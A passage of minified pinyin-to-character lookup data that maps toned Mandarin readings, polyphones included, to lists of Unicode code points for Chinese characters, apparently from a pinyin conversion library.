xuān\":[23323],\"dǒng\":[23326,25026,31677,33891,34155,35532],\"cān\":[23328,28236,29208,39137,39184,39490,39574],\"tiǎo\":[23333,23464,26176,26387,31409,33025],\"bí\":[23350,33656,40763],\"liǔ\":[23356,26611,26625,26718,26746,27246,29102,29643,32185,32506,32630,32640,37622,38157],\"qiān xiān\":[23365,27430],\"xié huī\":[23368],\"huān quán\":[23369],\"lí lì\":[23371,40599],\"zhú chuò\":[23374],\"kǒng\":[23380,24656],\"mā zī\":[23382],\"sūn xùn\":[23385,23403],\"bèi bó\":[23387,35478],\"yòu niū\":[23399],\"zhuǎn\":[23400,31473,36681],\"hái\":[23401,39608],\"nāo\":[23404],\"chán càn\":[23409],\"bò\":[23417,27287,34327,35666],\"nái\":[23419,33097],\"níng nìng\":[23425,23501,23511,23516,23527,29999],\"zhái\":[23429],\"tū jiā\":[23434],\"sòng\":[23435,35359,35494,35772,35829,36865,37817,38924,39042,39224],\"ròu\":[23437,32905,35699],\"zhūn\":[23442,31360,34912,35524,35846,36813],\"mì fú\":[23443],\"dàng tàn\":[23445],\"wǎn yuān\":[23451],\"chǒng\":[23456,23541],\"qún\":[23469,23790,24108,32675,32676,35033,35040],\"zǎi\":[23472,23869],\"bǎo shí\":[23474],\"jiā jia jie\":[23478],\"huāng huǎng\":[23482],\"kuān\":[23485,23515,23532,33239,37991,39627,39638],\"sù xiǔ xiù\":[23487],\"jié zǎn\":[23489],\"bìng bǐng\":[23502],\"jìn qǐn\":[23510],\"lóu jù\":[23520],\"xiě xiè\":[23531],\"qīn qìn\":[23540],\"cùn\":[23544,31871],\"duì\":[23545,23550,23565,24636,24989,25055,28647,28713,30867,31051,32144,34225,35656,35701,36699,38431,38510],\"lüè luó\":[23549],\"shè yè yì\":[23556],\"jiāng jiàng qiāng\":[23558],\"jiāng jiàng\":[23559,27974,28479,30074],\"zūn\":[23562,23967,27197,32583,36981,37903,40018,40159,40334,40439],\"shù zhù\":[23564,28557],\"xiǎo\":[23567,26195,26241,26313,30363,30370,31601,31615,31712,35599],\"jié jí\":[23568,35800,38794],\"shǎo shào\":[23569],\"ěr\":[23570,23571,23572,26670,27622,27953,29246,29669,32819,34238,34888,36272,36841,36999,37498,38098,39180,39285,39404],\"wāng yóu\":[23586],\"wāng\":[23587,23593,23594,23595,27754],\"liào\":[23589,23590,24278,25730,26009,28819,31415,37904,38243],\"méng máng lóng páng\":[23592],\"gà\":[23596,39744],\"kuì kuǐ\":[23599],\"tuí\":[23605,24346,31336,34312,36458,38564,38969,38970,38973,39059,39755],\"yǐn\":[23609,23998,24341,26372,27267,27324,27389,28158,28645,30270,30318,31884,34335,34451,34750,35732,36218,36251,36625,37391,38775],\"chǐ chě\":[23610],\"kāo\":[23611,39643],\"jìn jǐn\":[23613],\"wěi yǐ\":[23614],\"niào suī\":[23615],\"céng\":[23618,23652,23954,39507],\"diǎo\":[23628],\"bīng píng bǐng\":[23631],uu:[23639,26338,32833,34418,34634,38375],\"lòu\":[23642,28431,30232,30266,30267,37860,38210,38475],\"shǔ zhǔ\":[23646,23660],\"xiè tì\":[23647],\"chè cǎo\":[23662],\"tún zhūn\":[23663],\"nì jǐ\":[23664],\"hóng lóng\":[23672],\"qǐ kǎi\":[23682,35912],\"áng\":[23687,26114,26171],\"gǎng gāng\":[23703,23831],\"kě\":[23714,25956,28167,28212,28835],\"gǒu\":[23715,29399,29629,31537,32775,32776,32777,33503,35967],\"tiáo\":[23719,23737,27172,31058,31524,33408,33812,34010,34024,34601,36834,37594,37797,38807,39659,39880,39991,40102,40800,40838],\"qū jū\":[23720],\"lǐng\":[23725,23994,38936,39046],\"pò\":[23734,25920,27942,28240,28894,29632,30772,30774,31893,33962,39748],\"bā kè\":[23751],\"luò\":[23752,25694,27931,27932,29334,29662,31551,32409,33638,35451,38610,39409,39558,40261],\"fù niè\":[23754],\"ěn\":[23758],\"zhì shì\":[23769,23867],\"qiǎ\":[23776,36306,37216,38800],\"qiáo jiào\":[23780,30276],\"xié yé\":[23787],\"bū\":[23788,24239,26209,35495,36875,37437,37691,38072,39188,40271],\"chóng\":[23815,23816,29214,34411,34665,34802,35080,38528],\"zú cuì\":[23826,26890],\"líng léng\":[23834],\"dòng dōng\":[23840],\"xiáo\":[23844,27944,28102,35364,35509],\"pí bǐ\":[23845,33432],\"zhǎn chán\":[23853,23939,23940],\"wǎi wēi\":[23860],\"yáng dàng\":[23861],\"shì dié\":[23868],\"yào\":[23870,26332,29070,29183,30661,31358,31380,31556,32768,33374,33647,33903,34220,34277,34958,35230,35407,35729,38783,40386,40542,40764],\"kān zhàn\":[23873],\"hán dǎng\":[23877],\"qiàn kàn\":[23884],\"wù máo\":[23885],\"kě jié\":[23889,23985],\"wēi wěi\":[23892],\"kē\":[23897,26607,26869,27068,27158,29249,29297,29328,29634,30132,30604,30933,31002,31185,31262,31392,33834,34198,34485,34636,36279,36722,37272,37427,38070,38950,38982,39063,39617],\"dàng táng\":[23907],\"róng yíng\":[23908,29187],\"ái kǎi\":[23910],\"kāo qiāo\":[23914],\"cuó\":[23919,23923,30180,30700,33963,34070,34392,40570,40574],\"qiǎn qīn\":[23920],\"dì dié\":[23933],\"cēn\":[23934],\"dǐng\":[23935,33404,34209,37924,38914,39030,40718,40721],\"áo ào\":[23941],\"pǐ pèi\":[23951],\"jiào qiáo\":[23968,28496],\"jué guì\":[23969,40156],\"zhān shàn\":[23974,40163],\"xiè jiè\":[23984],\"guī xī juàn\":[23986],\"rū\":[23999],\"lì liè\":[24001,26841,29188,32159],\"xī guī juàn\":[24002],\"yíng hōng\":[24006],\"yǐng\":[24010,24302,24433,25708,26796,28481,30271,30317,30696,31310,37090,37915,38964,39053,39061,39062],\"chǎo\":[24016,28818,29052,30503,40616],\"cuán\":[24017,27349,27409],\"chuān\":[24027,24029,27674,29775,31359],\"jīng xíng\":[24032],\"cháo\":[24034,24035,26177,28421,28526,29258,31410,32634,35647,36680,37147,40716],\"qiǎo\":[24039,24832,39644],\"gǒng\":[24041,24318,25329,25330,26673,27742,29657,36609,38799],\"chà chā chāi cī\":[24046],\"xiàng hàng\":[24055],\"shuài\":[24069,24101,34752],\"pà\":[24074,24085,24597,34969],\"tǎng nú\":[24081],\"mò wà\":[24083],\"tiē tiě tiè\":[24086],\"zhǒu\":[24090,26221,30107,30573,31634,32920,33783,39902],\"juǎn juàn\":[24099],\"shuì\":[24104,28055,28058,30561,31237,31246,35038],\"chóu dào\":[24113,24172],\"jiǎn jiān sàn\":[24116],\"shà qiè\":[24121],\"qí jì\":[24122,33632],\"shān qiāo shēn\":[24147],\"zhuàng chuáng\":[24162],\"chān chàn\":[24168],\"miè\":[24173,25073,25635,28357,28781,28885,31011,31742,34065,34190,34843,34890,37974,40052,40211],\"gān gàn\":[24178],\"bìng bīng\":[24182,24183],\"jī jǐ\":[24190],\"guǎng ān\":[24191],\"guǎng\":[24195,24291,29367,29559],me:[24197],\"dùn tún\":[24201],\"bài tīng\":[24205],\"yìng yīng\":[24212],\"dǐ de\":[24213],\"dù duó\":[24230],\"máng méng páng\":[24236],\"bìng píng\":[24240],\"chěng\":[24241,24732,30536,36894,39425,39563],\"jī cuò\":[24244],\"qǐng\":[24252,24270,27326,28416,33496,35531,35622,35831,38915,39031],\"guī wěi huì\":[24262],\"jǐn qín\":[24273],\"kuò\":[24275,25193,25313,25844,28662,31560,33855,33856,34526,38346,38420,38697,38815,38841,38869,38946,39712],\"qiáng sè\":[24295,34196],\"yǐn yìn\":[24308,38544,38560,38577,39150,39154,39278],\"pò pǎi\":[24313,36843],\"nòng lòng\":[24324],\"dì tì tuí\":[24351],\"jué zhāng\":[24353],\"mí mǐ\":[24357,24396,38753],\"chāo\":[24360,24586,25220,27433,35372,36229,37396,38046],yi:[24364],\"shāo\":[24368,26067,28903,28988,29138,31602,33348,33847,34161,36622,39678,39865],\"xuān yuān\":[24370],\"qiáng qiǎng jiàng\":[24375,24378],\"tán dàn\":[24377,37256],\"biè\":[24390],\"qiáng jiàng qiǎng\":[24394],\"jì xuě\":[24400],\"tuàn\":[24406,35094],\"yuē\":[24415,26352,26353,30705],\"shān xiǎn\":[24417],\"wén\":[24419,25991,28806,29683,30226,32359,32862,33440,34441,34442,34721,34753,38330,38335,38341,38374,38395,38412,38639,39356,39367,39792,40188,40205,40740],\"péng bāng\":[24429],\"piāo piào\":[24431],\"zhuó bó\":[24436],\"tuǒ yí\":[24437],\"páng fǎng\":[24439],\"wǎng\":[24442,24448,24451,24792,26505,26850,32178,32593,32594,32595,32596,32598,33781,34535,34628,35511,36638,36747,39757],\"cú\":[24450,27522],\"dài dāi\":[24453],\"huái\":[24458,24576,25040,25079,27088,28142,32818,34361,35106,35121,36381],\"wā wàng jiā\":[24461],\"chěng zhèng\":[24462],\"dé děi de\":[24471],\"cóng zòng\":[24478],\"shì tǐ\":[24485],\"tí chí\":[24498,40343,40345],\"dé\":[24499,24503,24692,24755,24810,28098,37696,38173],\"zhǐ zhēng\":[24500,24501],\"bié\":[24502,30335,33666,34498,35154,36457],\"chōng zhǒng\":[24504],\"jiǎo jiào\":[24508,31493,31562],\"lòng lǒng\":[24511],\"qú jù\":[24514,28192,30655,34742],\"dìng tìng\":[24522],\"gǎi\":[24523,25913],\"rěn\":[24525,26656,26659,31225,31252,32155,33615,33653,36533],\"chàn\":[24527,25076,25082,30815,32700,38850,39019],\"tè\":[24529,24925,29305,34776,37617,38141],\"tè tēi tuī\":[24530],\"gān hàn\":[24531,25916],\"yì qì\":[24532],\"tài shì\":[24533],\"xī liě\":[24538],\"yīng yìng\":[24540,25033,35661],\"mǐn wěn mín\":[24542,24543],\"sōng zhōng\":[24554],\"yù shū\":[24556,24710],\"qí shì\":[24559,32774],\"tún zhūn dùn\":[24563],\"qián qín\":[24564,25202],\"hún\":[24566,27985,28222,39195,39300,39746,40754],\"niǔ\":[24568,25197,28804,29379,32016,32445,33701,37397,38062,38773],\"kuáng wǎng\":[24569],\"kāng hàng\":[24572],\"kài xì\":[24574,24894],\"òu\":[24580,24938],\"bǎo bào\":[24585],\"mín mén\":[24587],\"zuò zhà\":[24589],\"zěn\":[24590],\"yàng\":[24591,24665,26679,27096,27171,28478,32661,35399],\"kòu jù\":[24592],\"náo niú\":[24595],\"zhēng zhèng\":[24596,25497,38066,38126],\"tiē zhān\":[24599],\"hù gù\":[24600],\"cū jù zū\":[24602],\"sī sāi\":[24605],\"yóu chóu\":[24606],\"tū dié\":[24610],\"yōu yào\":[24622],\"xuàn\":[24624,26145,26982,27883,28210,28843,29700,30505,30905,32098,32316,32335,32474,34073,34898,34984,36121,37449,37831,38089,38239,39092],\"xù xuè\":[24628],\"bì pī\":[24630],\"xī shù\":[24632],\"nèn nín\":[24641],\"tiāo yáo\":[24652],\"xī qī xù\":[24659],\"xiào jiǎo\":[24660],\"hū kuā\":[24663],\"nǜ\":[24679,26386,34882,34884],\"hèn\":[24680],\"dòng tōng\":[24683],\"quán zhuān\":[24686],\"è wù ě wū\":[24694,24801],\"tòng\":[24696,24927,24965,30171,34901],\"yuān juàn\":[24705],\"qiāo qiǎo\":[24708],\"jiè kè\":[24712],\"hào jiào\":[24718],\"huǐ\":[24724,27283,27584,27585,27591,29164,35693],\"mán mèn\":[24727,38804],\"yī yì\":[24728,34915],\"quān\":[24731,31646,37897],\"kuī lǐ\":[24733],\"yì niàn\":[24741],\"mèn mēn\":[24758],\"guàn\":[24761,24762,24815,24931,25532,25692,27148,27423,27892,28075,28485,28748,29215,29912,30437,31030,31100,32582,32592,36011,36143,36480,36966,37830,38005,40057,40475,40563],\"kōng kǒng\":[24766],\"lǔn lùn\":[24768],\"guǒ\":[24776,26524,26881,27112,31935,32182,33747,34622,35065,35073,36640,39196,39299],\"yuān wǎn\":[24780,31650],\"lán lín\":[24783],\"yù xù\":[24784,28130],\"chuò chuì\":[24793],\"hūn mèn\":[24795],\"chǎng tǎng\":[24797],\"suǒ ruǐ\":[24802],\"cǎn\":[24808,24920,25007,40682,40690],\"cán\":[24813,24921,24922,27531,27544,34453,34629,34870,34874],\"dàn dá\":[24814,24986],\"rě\":[24825],\"yú tōu\":[24841],\"kài qì\":[24850],\"dàng táng shāng yáng\":[24851],\"chén xìn dān\":[24854],\"kè qià\":[24856],\"nuò\":[24862,25062,25063,25535,25638,27026,31276,31332,31953,31973,31983,35582,35834,36419,36925,37737,38168],\"gǎn\":[24863,25792,25954,26751,27204,28553,28600,30383,31174,31240,31540,33417,34918,36214,36245,40036,40161],\"còng sōng\":[24865],\"sāi sī sǐ\":[24866],\"gōng gòng hǒng\":[24873,24912],\"shuò sù\":[24876,27948],\"yáo yào\":[24878],\"huàng\":[24880,26306,27045,28361,30365,30377,37796],\"zhěng\":[24888,25229,25327,25972,26232],\"cǎo\":[24890,33400,33609,39474],\"xì xié\":[24896],\"cǎo sāo\":[24901],\"xù chù\":[24905],\"qiè qiàn\":[24906],\"cáo cóng\":[24914],\"ào áo\":[24928],\"lián liǎn\":[24937,26815,27108,27363],\"jìn qín jǐn\":[24940],\"dì chì\":[24952],\"zhí zhé\":[24953],\"lóu lǚ\":[24954,40412],\"còng\":[24961,35621],\"zhī zhì\":[24964,30693,32340,32455],\"chēng\":[24966,25690,25744,25745,26239,26621,26854,27221,27273,27871,28030,29732,30624,30848,32253,32585,34511,34806,36202,36204,37887,37923,38455,38743,38963,39251],\"biē\":[24971,34380,40009,40150,40712,40862],\"chéng dèng zhèng\":[24981],\"xǐ xī\":[24984],\"duì dùn tūn\":[24990],\"xiāo jiāo\":[24994],\"xián xiàn\":[25002],\"liáo liǎo\":[25005,29134,29198,29202],\"shéng\":[25012,32260,32329,32361,32499,35677],\"náo nǎo náng\":[25017],\"jǐng jìng\":[25020],\"jǐ jiǎo\":[25023],\"xuān huān\":[25025],\"cǎo sāo sào\":[25030],\"mèn\":[25041,25059,26282,28950,29148],\"mèng méng měng\":[25052],\"ài yì nǐ\":[25053],\"méng měng\":[25054,30626,30674],\"qí jī jì\":[25056],\"mǒ\":[25057],\"lán xiàn\":[25058],\"yōu yǒu\":[25070],\"liú liǔ\":[25072,34288],\"ràng\":[25081,35698,35731,35753],\"huān\":[25085,27426,27475,27489,29566,35737,35995,37188,39529,40197,40269],\"nǎn\":[25089,25543,28275,29045,33129,34683,36199],\"mí mó\":[25090],\"gàng zhuàng\":[25093,25094],\"zhuàng gàng\":[25095],\"qu xū\":[25100],\"xì hū\":[25103,25135,25138],\"jiá gā\":[25115],\"zéi\":[25117,34824,36042,36156,39938,40033,40087],\"děng\":[25125,31561],\"hū xì\":[25137],\"chuō\":[25139,36372,36916],\"biǎn piān\":[25153],\"shǎng jiōng\":[25156],\"shàn shān\":[25159],\"cái\":[25165,26448,32404,35009,36001,36130],\"zhā zā zhá\":[25166],\"lè lì cái\":[25168],\"bā pá\":[25170],\"dǎ dá\":[25171],\"rēng\":[25172],\"fǎn fú\":[25173],\"diǎo dí yuē lì\":[25178],\"káng gāng\":[25179],\"yū wū\":[25180],\"yū wū kū\":[25181],\"tuō chǐ yǐ\":[25185],\"gǔ jié xì gē\":[25186],\"dèn\":[25189,25213],\"sǎo sào\":[25195,25475],\"rǎo\":[25200,25854,38562],\"xī chā qì\":[25201],\"bān pān\":[25203],\"bā ào\":[25207],\"xī zhé\":[25208],\"zhì sǔn kǎn\":[25211],\"zhǎo\":[25214,27836,29813],\"kuáng wǎng zài\":[25218],\"hú gǔ\":[25223,40516,40536],\"bǎ bà\":[25226],\"dǎn shěn\":[25228],\"nè nì ruì nà\":[25232],\"zhuā\":[25235,27291,31803,33212,39677],\"póu\":[25236,35026],\"zhé shé zhē\":[25240],\"póu pōu fū\":[25241,25418],\"pāo\":[25243,25291,33068,33826],\"ǎo ào niù\":[25245],\"lūn lún\":[25249,25476],\"qiǎng qiāng chēng\":[25250],\"zhǐ zhǎi\":[25255],\"bù pū\":[25258,26600],\"yǎo tāo\":[25261],\"hē hè qiā\":[25266],\"nǐ ní\":[25267],\"pī pēi\":[25271],\"mǒ mò mā\":[25273],\"chōu\":[25277,29352,29355,30259,31704],\"jiā yá\":[25281],\"fú bì\":[25282,30032,40349],\"zhǎ\":[25283,30504,30751,39866,40093],\"dān dàn dǎn\":[25285],\"chāi cā\":[25286],\"niān\":[25288,34091],\"lā lá lǎ là\":[25289],\"bàn pàn\":[25292],\"pāi\":[25293],\"līn\":[25294],\"guǎi\":[25296,26548,26618],\"tuò tà zhí\":[25299],\"ào ǎo niù\":[25303],\"jū gōu\":[25304],\"pīn pàn fān\":[25306],\"bài bái\":[25308],\"bài\":[25309,25943,31255,31930,34221,36097,36133,38875],\"qiá\":[25316],\"nǐng níng nìng\":[25319],\"zé zhái\":[25321,25799],\"hén\":[25323,30165,38798],\"kuò guā\":[25324],\"jié jiá\":[25326],\"nǐn\":[25328],\"shuān\":[25332,26643,38274,38377],\"cún zùn\":[25333],\"zā zǎn\":[25334,26714],\"kǎo\":[25335,25911,26674,28900,32771],\"yí chǐ hài\":[25336],\"cè sè chuò\":[25338],\"zhuài zhuāi yè\":[25341],\"shí shè\":[25342],\"bāi\":[25344,25520],\"kuò guāng\":[25348],\"nòng\":[25354,25397,40776],\"jiào jiāo\":[25357,25934,25945],\"kuà kū\":[25358],\"ná rú\":[25360],\"tiāo tiǎo\":[25361],\"dié shè\":[25365],\"liě\":[25368,27615],\"yà yǎ\":[25372,25495],\"wō zhuā\":[25373],\"xié jiā\":[25375,25406],\"dǎng dàng\":[25377,25803],\"zhèng zhēng\":[25379,27491,30151],\"āi ái\":[25384],\"tuō shuì\":[25385,25437],\"tǐ tì\":[25390],\"suō shā\":[25393],\"sā shā suō\":[25394],\"kēng qiān\":[25395,25724],\"bàng péng\":[25399],\"ruó ruá\":[25404],\"jiǎo kù\":[25409],\"wǔ wú\":[25410],\"tǒng\":[25413,26742,31570,31593,32113,32130,32479],\"huò chì\":[25415],\"tú shū chá\":[25416],\"lǚ luō\":[25419],\"shāo shào\":[25422,31245],\"niē\":[25423,25553],\"shù sǒng sōu\":[25426],\"yé yú\":[25427],\"jué zhuó\":[25428],\"bù pú zhì\":[25431],\"zùn\":[25432,37516],\"lāo\":[25438,25736,31913],\"sǔn\":[25439,25613,27051,31499,31565,31664,37800,38588],\"wàn wǎn wān yù\":[25445],\"pěng\":[25447,28110,30351],\"shě\":[25448],\"fǔ fù bǔ\":[25452],\"dáo\":[25455],\"luò luǒ wǒ\":[25456],\"juǎn quán\":[25458],\"chēn tiǎn\":[25461],\"niǎn niē\":[25467],\"ruó wěi ré\":[25468],\"zuó\":[25469,26152,31208,31251,31600,33675,37436],\"wò xiá\":[25470],\"qìng qiàn\":[25477],\"póu pǒu\":[25482],\"qiā\":[25488,33884],\"pái pǎi\":[25490],\"qiān wàn\":[25492],\"yè yē\":[25494],\"niè nǐ yì\":[25500],\"huò xù\":[25501],\"yàn shàn yǎn\":[25502],\"zhěng dìng\":[25503],\"kòng\":[25511,38810],\"tuī\":[25512,34039,34284],\"zōu zhōu chōu\":[25515],\"tiàn\":[25517,33306],\"kèn\":[25519,35017,35075],\"pá\":[25521,26487,28502,29228,29750,31586],\"guó guāi\":[25524],\"dǎn shàn\":[25528,25763],\"chān xiān càn shǎn\":[25530],\"sāo\":[25531,25620,28318,32325,32555,34726,39442,39479,39968,40034,40139],\"pèng\":[25533,26922,27120,30896,36395],\"zhēng kēng\":[25537],\"jiū yóu\":[25538],\"jiān jiǎn\":[25539,31835],\"pì chè\":[25546],\"sāi zǒng cāi\":[25548],\"tí dī dǐ\":[25552],\"zǒng sōng\":[25556],\"huáng yóng\":[25560],\"zǎn zuàn\":[25565],\"xū jū\":[25567],\"ké qiā\":[25570],\"chuāi chuǎi chuài tuán zhuī\":[25571],\"dì tì\":[25573],\"lá là\":[25574],\"là\":[25575,26955,28290,29902,30220,32715,33240,34635,34674,34847,36770,36771,37982,38260,39694,39931],\"jiē qì\":[25581],\"chòng dǒng\":[25584],\"dié shé yè\":[25586],\"jiàn qián jiǎn\":[25589],\"yé\":[25590,29239,29242,29784,37603,37761,38104],\"chān\":[25600,25723,25881,35047,35164,35224,35271,36799,37587],\"gē gé\":[25601,25841],\"lǒu lōu\":[25602,25695],\"chōu zǒu\":[25610],\"chuāi\":[25611],\"sūn\":[25614,27074,29426,29499,33642,33984,34165,34206,39143,39153],\"róng náng nǎng\":[25617],\"péng bàng\":[25618],\"cuō\":[25619,29811,30923,36425,36979,37277],\"kē è\":[25621],\"nù nuò nòu\":[25625],\"lā xié xiàn\":[25626],\"qiǔ\":[25629,31959],\"xiǎn xiān\":[25631],\"jié zhé\":[25641],\"pán bān pó\":[25643],\"bān\":[25644,25917,26001,26002,29677,30242,30285,32934,34689,34700,35113,36780,38930,39041],\"zhì nái\":[25649],\"wā wǎ wà\":[25650],\"huá\":[25651,25782,28369,29502,34128,34710,35649,37877,38119,39498,39557,40424],\"qiāng qiǎng chēng\":[25654],\"tián shēn\":[25655],\"ná nuò\":[25659],\"èn\":[25665],\"shè niè\":[25668,25885],\"bìn\":[25672,25839,27553,27567,33169,33231,39628,39637,39657,39682,39699,39714],\"shā sà shǎi\":[25675],\"chǎn sùn\":[25676],\"jiū liú liáo jiǎo náo\":[25678],\"féng pěng\":[25683],\"shuāi\":[25684],\"dì tú zhí\":[25685],\"qì jì chá\":[25686],\"sōu sǒng\":[25687],\"liǎn liàn\":[25689],\"gài xì\":[25697],\"hù chū\":[25698],\"tàng\":[25701,28907,29145,37899],\"nái zhì\":[25704],\"mó mā\":[25705],\"jiāng qiàng\":[25706],\"áo qiáo\":[25710],\"niè chè\":[25712],\"mán màn\":[25713],\"chàn cán\":[25714],\"sè mí sù\":[25717],\"biāo biào\":[25725],\"juē jué\":[25733],\"piē\":[25734,26300,27669,30629],\"piě piē\":[25735],\"zǎn zān zēn qián\":[25741],\"sā sǎ\":[25746],\"hòng\":[25748,35340,35751,38336,39720],\"héng guàng\":[25751],\"niǎn\":[25754,25781,25862,28042,28990,30910,31760,36429,36456,36494,36646,36743],\"chéng zhěng\":[25756],\"huī wéi\":[25757],\"cāo\":[25761,25805,31961],\"xiāo sōu\":[25768],\"liáo liāo\":[25769],\"cuō zuǒ\":[25774],\"wěi tuǒ\":[25777],\"cuān\":[25786,25883,27718,36479,36517,38009,38249],\"qiào yāo jī\":[25789],\"zhuā wō\":[25790],\"lèi léi\":[25794],\"nǎng\":[25795,25902,26345,28770],\"qíng jǐng\":[25807],\"kuǎi\":[25811,33967],\"pǐ bò\":[25815],\"bò bāi\":[25816],\"jù jǐ\":[25818],\"mēng\":[25821],\"sǒu sòu\":[25822],\"xǐng\":[25828,31669,37266],\"cā\":[25830],\"níng nǐng nìng\":[25840],\"zhì jié\":[25843],\"là liè\":[25848,29193],\"sòu sǒu\":[25851],\"lì luò yuè\":[25853],\"tī zhāi zhì\":[25855],\"pān\":[25856,28504,30469,33824],\"lèi\":[25858,27882,28057,28122,31159,31867,32391,34353,37241,37511,37649,38939,38954,39006,39075],\"cā sǎ\":[25859],\"jùn pèi\":[25864],\"lì luò\":[25866,36498],\"là lài\":[25867,27380],\"lú luó\":[25870],\"zǎn cuán\":[25874],\"xiān jiān\":[25877],\"mí mǐ mó\":[25888],\"zǎn cuán zàn zuān\":[25890],\"zuàn\":[25893],\"lì shài\":[25894],\"lì luǒ\":[25901],\"guǐ guì\":[25905],\"jī qī yǐ\":[25906],\"fàng\":[25918],\"wù móu\":[25924],\"chù shōu\":[25930],\"gé guó è\":[25931],\"duó duì\":[25939,25946],\"duō què\":[25952,25962],\"sàn sǎn\":[25955],\"dūn duì\":[25958,38246],\"qī yǐ jī\":[25959],\"xiào xué\":[25961],\"shù shǔ shuò\":[25968,25976],\"ái zhú\":[25969,25971],\"xiòng xuàn\":[25979],\"zhuó zhú\":[25984],\"yì dù\":[25985],\"lí tái\":[25988],\"fěi fēi\":[26e3],\"yǔ zhōng\":[26004],\"dòu dǒu\":[26007],\"wò guǎn\":[26017],\"tǒu tiǎo\":[26018],\"dòu\":[26019,26794,28002,30168,31398,31431,33072,33651,35910,36887,37078,37208,38295,38360,39190,39294,39717,39718,39722,39724,39725],\"yín zhì\":[26022],\"chǎn jiè\":[26042],\"wū yū yú\":[26044],\"yóu liú\":[26047],\"páng bàng\":[26049],\"máo mào\":[26052],\"pī bì\":[26055],\"xuán xuàn\":[26059],\"wú mó\":[26080],\"zǎo\":[26089,26531,26630,26839,28577,29866,34235,34299,34468],\"gā\":[26094],\"gàn hàn\":[26096],\"tái yīng\":[26098],\"xū xù\":[26100],\"tūn zhùn\":[26109],\"wù wǔ\":[26111],\"pò pèi\":[26146],\"zòng\":[26158,29460,30125,30258,31933,31945,31981,32294],\"ǎi\":[26169,27600,30702,34108,34297,35690,36535,38701,38724],\"huàng huǎng\":[26179],\"xuǎn\":[26181,30307,30316,36873,36984],\"xù kuā\":[26183],\"hǒng\":[26190],\"shài\":[26194,26348],\"yūn yùn\":[26197,29044],\"shèng chéng\":[26207,26889,30427],\"jǐng yǐng\":[26223],\"shǎn\":[26225,29068,30546,35234,38275,38378,38485,38493],\"qǐ dù\":[26229],\"ǎn àn yǎn\":[26235],\"wǎng wàng\":[26240],\"zàn\":[26242,26283,29897,29906,29914,31158,35192,35715,35738,36059,36106,36190,36436,37180,37694,37864,39265],\"yùn yūn\":[26248],\"mín mǐn\":[26251],\"dǔ shǔ\":[26255],\"shǔ\":[26257,26329,28539,30297,31980,32626,34213,34223,34295,34560,34868,35169,35177,40042,40048,40653,40736,40737],\"jiǎn lán\":[26261],\"nuǎn\":[26262,29015,39210],\"bào pù\":[26292],\"xī xǐ\":[26303],\"pù bào\":[26333,28689],\"qū qǔ\":[26354,32054],\"gèng gēng\":[26356],\"hū hù\":[26358,38653],\"zēng céng\":[26365,27239],\"céng zēng\":[26366,31474],\"cǎn qián jiàn\":[26369],\"qiè hé\":[26373],\"bì pí\":[26375,31110,31507,35048],\"yǒu yòu\":[26377],\"bān fén\":[26380,40187],\"fú fù\":[26381,27921],\"fěi kū\":[26383,32976],\"qú xù chǔn\":[26384],\"juān zuī\":[26392],\"huāng máng wáng\":[26394],\"qī jī\":[26399],\"tóng chuáng\":[26403,27238],\"zhá\":[26413,29264,31642,34491,35671,37720,38113,38296,38392],\"zhú shù shú\":[26414],\"shù shú zhú\":[26415],\"zhū shú\":[26417],\"pǔ pò pō piáo\":[26420],\"dāo tiáo mù\":[26423],\"guǐ qiú\":[26425],\"xiǔ\":[26429,28395,28483,31956],\"chéng chēng\":[26430],\"zá\":[26434,27823,30776,35149,38609,38620,38629,38900],\"yú wū\":[26437],\"gān gǎn\":[26438],\"chā chà\":[26440],\"shān shā\":[26441],\"cūn\":[26449,30388,31476,33189,36358,37032],\"rèn ér\":[26450,26773],\"sháo biāo\":[26451],\"dì duò\":[26453,26532],\"gū gài\":[26458],\"yí zhì lí duò\":[26461],\"gàng gāng\":[26464],\"tiáo tiāo\":[26465,26781],\"mà mǎ\":[26473],\"sì zhǐ xǐ\":[26475],\"yuán wán\":[26476,34454],\"bèi fèi\":[26478],\"shū duì\":[26488],\"niǔ chǒu\":[26491],\"wò yuè\":[26498,33234],\"máo\":[26502,27611,27650,28213,29286,30683,32606,33541,33542,34661,34762,36574,37205,37502,37672,38170,39654,40348],\"pī mì\":[26504],\"àng\":[26506,30414,37280],\"fāng bìng\":[26507],\"hù dǐ\":[26513],\"xín\":[26516,35153,37908,39733],\"yāo yǎo\":[26518],\"ě è\":[26521],\"zhī qí\":[26525],\"cōng zōng\":[26526,27141],\"xiān zhēn\":[26542],\"tái sì\":[26545],\"gǒu jǔ gōu\":[26552],\"bāo fú\":[26553],\"yì xiè\":[26555,26663],\"tuó duò\":[26561,39345,39364,39534],\"yí duò lí\":[26562],\"nǐ chì\":[26565],\"pán bàn\":[26568,36312],\"yǎng yàng yāng yīng\":[26573],\"fù fū fǔ\":[26574],\"bǎi bó bò\":[26575],\"mǒu\":[26576],\"sháo shào\":[26582],\"zhè\":[26584,27164,27993,28123,34071,34757,36889,40403,40551],\"yòu yóu\":[26586,27390],\"guì jǔ\":[26588],\"zhà zuò\":[26590],\"dié zhì\":[26595,30512],\"zhā zǔ zū\":[26596],\"chá zhā\":[26597,26619],\"āo ào\":[26602,36586],\"bā fú pèi bó biē\":[26605],\"duò zuó wù\":[26606],\"bì bié\":[26610],\"zhù chù\":[26615],\"bēi pēi\":[26616],\"shì fèi\":[26617],\"shān zhà shi cè\":[26629],\"lì yuè\":[26638,27359],\"qì qiè\":[26644,30732],\"qī xī\":[26646,36426],\"guā kuò\":[26653],\"bīng bēn\":[26655],\"xiào jiào\":[26657],\"jiàn zùn\":[26667,35e3],\"yǒu yù\":[26671],\"hé hú\":[26680],\"gēn\":[26681,36319],\"zhī yì\":[26682],\"gé gē\":[26684],\"héng háng\":[26689],\"guàng guāng\":[26692],\"yí tí\":[26699,33617],\"sāng\":[26705,26706,27105],\"jú jié\":[26708],\"yú móu\":[26713],\"ráo náo\":[26721,27208],\"guì huì\":[26727,27292],\"chén zhèn\":[26733],\"tīng yíng\":[26735],po:[26738],\"bèn fàn\":[26739],\"fēng fèng\":[26747,33873],\"sù yìn\":[26752],\"tǐng tìng\":[26755],\"xuān juān xié\":[26763],\"tú chá\":[26764],\"āo yòu\":[26766],\"kuǎn\":[26785,27445,27454,27456],\"shāo sào\":[26786],\"qín chén cén\":[26787],\"lí sì qǐ\":[26793],\"chān yán\":[26804],\"bīn bīng\":[26809,27103,27315],\"táo chóu dào\":[26812],\"cōng sōng\":[26823],\"gùn hùn\":[26829],\"dé zhé\":[26831],\"pái bèi pèi\":[26833],\"bàng pǒu bèi bēi\":[26835],\"dì dài tì\":[26851],\"sēn\":[26862,26926,27118,35138],\"rěn shěn\":[26863],\"léng 